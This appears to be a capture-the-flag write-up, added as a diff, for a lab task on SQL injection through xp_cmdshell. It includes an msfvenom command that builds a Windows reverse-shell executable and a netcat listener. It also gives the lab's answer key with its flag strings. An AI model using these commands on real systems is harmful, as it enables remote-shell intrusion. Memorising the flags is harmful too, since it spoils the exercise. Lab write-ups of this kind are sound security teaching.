@@ -1,0 +1,24 @@
+Task 16  [Day 10] SQL injection Inject the Halls with EXEC Queries
+
+xp_cmdshell is a system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within SQL Server. It provides a mechanism for SQL Server to interact directly with the host operating system's command shell. 
+While it can be a powerful administrative tool, it can also be a security risk if not used cautiously when enabled.
+
+MSFvenom is a command-line payload generation tool. It's part of the Metasploit Framework, a widely used penetration testing and ethical hacking set of utilities. MSFvenom is explicitly designed for payload generation and can be used to generate a Windows executable that, when executed, will make a reverse shell connection back to our AttackBox. 
+We can run the following command on a Kali machine (or the AttackBox):
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
+nc -lnvp 4444
+
+Q. Manually navigate the defaced website to find the vulnerable search form. What is the first webpage you come across that contains the gift-finding feature?
+Ans: giftsearch.php
+
+Q. Analyze the SQL error message that is returned. What ODBC Driver is being used in the back end of the website?
+Ans: ODBC Driver 17 for SQL Server
+
+Q. Inject the 1=1 condition into the Gift Search form. What is the last result returned in the database?
+Ans: THM{a4ffc901c27fb89efe3c31642ece4447}
+
+Q. What flag is in the note file Gr33dstr left behind on the system?
+Ans: THM{b06674fedd8dfc28ca75176d3d51409e}
+
+Q. What is the flag you receive on the homepage after restoring the website?
+Ans: THM{4cbc043631e322450bc55b42c}
